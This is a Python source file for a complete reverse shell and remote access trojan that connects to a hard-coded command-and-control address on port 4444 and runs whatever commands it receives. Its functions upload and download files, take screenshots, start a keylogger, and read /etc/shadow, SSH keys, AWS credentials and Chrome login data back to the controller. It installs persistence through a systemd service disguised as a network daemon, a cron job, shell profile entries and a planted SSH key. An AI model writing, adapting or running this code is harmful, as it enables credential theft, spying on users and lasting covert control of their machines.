#!/usr/bin/env python3
import socket
import subprocess
import os
import time
import sys
import shutil
import platform
import pty
import json
import base64

print("🚀 ADVANCED Reverse Shell - Starting...")

# ======== YOUR WINDOWS IP ========
C2_IP = "192.168.1.167"
C2_PORT = 4444
# =================================

class AdvancedReverseShell:
    def __init__(self):
        self.current_dir = os.getcwd()
        self.sessions = {}
        
    def execute_command(self, cmd):
        """Execute command with enhanced capabilities"""
        try:
            # Handle special commands
            if cmd.startswith('cd '):
                return self.change_directory(cmd[3:])
            elif cmd == 'getuid':
                return f"User: {os.getenv('USER')} (UID: {os.getuid()})"
            elif cmd == 'pwd':
                return self.current_dir
            elif cmd == 'sysinfo':
                return self.get_system_info()
            elif cmd.startswith('download '):
                return self.download_file(cmd[9:])
            elif cmd.startswith('upload '):
                return self.upload_file(cmd[7:])
            elif cmd == 'persistence':
                return self.install_persistence()
            elif cmd == 'screenshot':
                return self.take_screenshot()
            elif cmd == 'keylogger_start':
                return self.start_keylogger()
            elif cmd == 'keylogger_stop':
                return self.stop_keylogger()
            elif cmd == 'get_passwords':
                return self.extract_passwords()
            elif cmd == 'privilege_escalation':
                return self.privilege_escalation_scan()
            
            # Regular command execution
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, cwd=self.current_dir)
            output = result.stdout + result.stderr
            return output if output else "Command executed successfully"
            
        except Exception as e:
            return f"Error: {str(e)}"
    
    def change_directory(self, path):
        """Change directory with error handling"""
        try:
            if path == "..":
                self.current_dir = os.path.dirname(self.current_dir)
            elif path.startswith("/"):
                self.current_dir = path
            else:
                self.current_dir = os.path.join(self.current_dir, path)
            
            if not os.path.exists(self.current_dir):
                self.current_dir = os.path.dirname(self.current_dir)
                return f"Directory does not exist: {path}"
                
            return f"Changed to: {self.current_dir}"
        except Exception as e:
            return f"cd error: {str(e)}"
    
    def get_system_info(self):
        """Get comprehensive system information"""
        info = {
            "System": platform.system(),
            "Release": platform.release(),
            "Version": platform.version(),
            "Architecture": platform.machine(),
            "Processor": platform.processor(),
            "Hostname": platform.node(),
            "Current User": os.getenv('USER'),
            "Current Directory": self.current_dir,
            "Python Version": platform.python_version()
        }
        
        # Get network info
        try:
            result = subprocess.run("hostname -I", shell=True, capture_output=True, text=True)
            info["IP Addresses"] = result.stdout.strip()
        except:
            info["IP Addresses"] = "Unknown"
            
        # Get disk info
        try:
            result = subprocess.run("df -h", shell=True, capture_output=True, text=True)
            info["Disk Usage"] = result.stdout
        except:
            info["Disk Usage"] = "Unknown"
            
        return json.dumps(info, indent=2)
    
    def download_file(self, remote_path):
        """Download file from target to C2"""
        try:
            if not os.path.exists(remote_path):
                return f"File not found: {remote_path}"
                
            with open(remote_path, 'rb') as f:
                file_data = base64.b64encode(f.read()).decode()
                
            return f"FILE_DOWNLOAD:{os.path.basename(remote_path)}:{file_data}"
        except Exception as e:
            return f"Download failed: {str(e)}"
    
    def upload_file(self, file_info):
        """Upload file from C2 to target"""
        try:
            parts = file_info.split(":", 1)
            if len(parts) != 2:
                return "Invalid upload format"
                
            filename, file_data = parts
            file_path = os.path.join(self.current_dir, filename)
            
            with open(file_path, 'wb') as f:
                f.write(base64.b64decode(file_data))
                
            return f"File uploaded: {file_path}"
        except Exception as e:
            return f"Upload failed: {str(e)}"
    
    def install_persistence(self):
        """Install multiple persistence mechanisms"""
        persistence_commands = [
            # Systemd service
            "mkdir -p /usr/lib/systemd/systemd-network",
            "cp /tmp/core.py /usr/lib/systemd/systemd-network/networkd 2>/dev/null || echo 'Systemd copy failed'",
            f'echo \'[Unit]\\nDescription=Systemd Network\\nAfter=network.target\\n[Service]\\nType=simple\\nExecStart=/usr/bin/python3 /usr/lib/systemd/systemd-network/networkd\\nRestart=always\\n[Install]\\nWantedBy=multi-user.target\' > /etc/systemd/system/systemd-networkd.service',
            "systemctl daemon-reload && systemctl enable systemd-networkd.service",
            
            # Cron job
            "(crontab -l 2>/dev/null; echo \"@reboot sleep 30 && python3 /usr/lib/systemd/systemd-network/networkd\") | crontab -",
            
            # Bash profile
            "echo 'python3 /usr/lib/systemd/systemd-network/networkd &' >> ~/.bashrc",
            "echo 'python3 /usr/lib/systemd/systemd-network/networkd &' >> ~/.profile",
            
            # SSH authorized_keys
            "mkdir -p ~/.ssh && echo 'ssh-rsa AAAAB3NzaC1yc2E...' >> ~/.ssh/authorized_keys 2>/dev/null || echo 'SSH failed'"
        ]
        
        results = []
        for cmd in persistence_commands:
            try:
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
                results.append(f"{cmd[:50]}...: {'Success' if result.returncode == 0 else 'Failed'}")
            except:
                results.append(f"{cmd[:50]}...: Timed out")
        
        return "Persistence installed:\\n" + "\\n".join(results)
    
    def take_screenshot(self):
        """Take screenshot if possible"""
        try:
            # Try different screenshot methods
            commands = [
                "import pyautogui; pyautogui.screenshot('/tmp/screenshot.png')",
                "scrot /tmp/screenshot.png",
                "gnome-screenshot -f /tmp/screenshot.png",
                "import pyscreenshot as ImageGrab; ImageGrab.grab().save('/tmp/screenshot.png')"
            ]
            
            for cmd in commands:
                try:
                    if cmd.startswith("import"):
                        subprocess.run(f"python3 -c '{cmd}'", shell=True, capture_output=True)
                    else:
                        subprocess.run(cmd, shell=True, capture_output=True)
                    
                    if os.path.exists("/tmp/screenshot.png"):
                        with open("/tmp/screenshot.png", "rb") as f:
                            screenshot_data = base64.b64encode(f.read()).decode()
                        return f"SCREENSHOT:{screenshot_data}"
                except:
                    continue
                    
            return "Screenshot failed: No method available"
        except Exception as e:
            return f"Screenshot error: {str(e)}"
    
    def privilege_escalation_scan(self):
        """Scan for privilege escalation opportunities"""
        escalation_checks = [
            # SUID files
            "find / -perm -4000 -type f 2>/dev/null | head -20",
            # Sudo permissions
            "sudo -l 2>/dev/null || echo 'No sudo access'",
            # World-writable files
            "find / -perm -o+w -type f 2>/dev/null | head -10",
            # Cron jobs
            "crontab -l 2>/dev/null || ls -la /etc/cron* 2>/dev/null | head -10",
            # Processes running as root
            "ps aux | grep root | head -10",
            # Kernel version
            "uname -a",
            # Capabilities
            "getcap -r / 2>/dev/null | head -10"
        ]
        
        results = ["🔍 PRIVILEGE ESCALATION SCAN:"]
        for check in escalation_checks:
            try:
                result = subprocess.run(check, shell=True, capture_output=True, text=True, timeout=5)
                output = result.stdout.strip() or result.stderr.strip()
                if output:
                    results.append(f"\\n=== {check} ===")
                    results.append(output[:500])  # Limit output length
            except:
                results.append(f"\\n=== {check} ===\\nTimed out")
        
        return "\\n".join(results)
    
    def start_keylogger(self):
        """Start keylogger (educational purposes only)"""
        try:
            keylogger_script = '''
import pyxhook
import time
log_file = "/tmp/keylog.txt"
def OnKeyPress(event):
    with open(log_file, "a") as f:
        f.write(f"{time.time()}: {event.Key}\\n")
hook = pyxhook.HookManager()
hook.KeyDown = OnKeyPress
hook.HookKeyboard()
hook.start()
'''
            with open("/tmp/keylogger.py", "w") as f:
                f.write(keylogger_script)
            
            subprocess.Popen(["python3", "/tmp/keylogger.py"], 
                           stdout=subprocess.DEVNULL, 
                           stderr=subprocess.DEVNULL)
            return "Keylogger started (if pyxhook installed)"
        except Exception as e:
            return f"Keylogger failed: {str(e)}"
    
    def stop_keylogger(self):
        """Stop keylogger"""
        try:
            subprocess.run("pkill -f keylogger.py", shell=True)
            return "Keylogger stopped"
        except:
            return "Failed to stop keylogger"
    
    def extract_passwords(self):
        """Extract password information"""
        try:
            password_files = [
                "/etc/passwd",
                "/etc/shadow",
                "~/.ssh/id_rsa",
                "~/.aws/credentials",
                "~/.config/google-chrome/Default/Login Data"
            ]
            
            results = ["🔐 PASSWORD EXTRACTION ATTEMPT:"]
            for file_path in password_files:
                expanded_path = os.path.expanduser(file_path)
                if os.path.exists(expanded_path):
                    try:
                        with open(expanded_path, 'r', errors='ignore') as f:
                            content = f.read()[:1000]  # First 1000 chars
                        results.append(f"\\n=== {file_path} ===\\n{content}")
                    except:
                        results.append(f"\\n=== {file_path} ===\\n[Permission denied or binary file]")
                else:
                    results.append(f"\\n=== {file_path} ===\\n[File not found]")
            
            return "\\n".join(results)
        except Exception as e:
            return f"Password extraction failed: {str(e)}"

    def connect(self):
        """Main connection loop"""
        shell = AdvancedReverseShell()
        
        while True:
            try:
                print(f"🔗 Connecting to {C2_IP}:{C2_PORT}...")
                
                s = socket.socket()
                s.settimeout(30)
                s.connect((C2_IP, C2_PORT))
                
                print("✅ Connected! Waiting for commands...")
                s.send(b"ADVANCED_SHELL_READY\n")
                
                while True:
                    # Receive command
                    data = s.recv(8192).decode().strip()
                    if not data:
                        continue
                        
                    print(f"📨 Received: {data[:50]}...")
                    
                    if data.lower() == 'exit':
                        break
                    
                    # Execute command
                    output = shell.execute_command(data)
                    
                    # Send output
                    s.send(output.encode())
                    
            except ConnectionRefusedError:
                print("❌ Connection refused - Is handler running on Windows?")
            except Exception as e:
                print(f"❌ Error: {e}")
            
            print("🔄 Retrying in 5 seconds...")
            time.sleep(5)

if __name__ == "__main__":
    AdvancedReverseShell().connect()
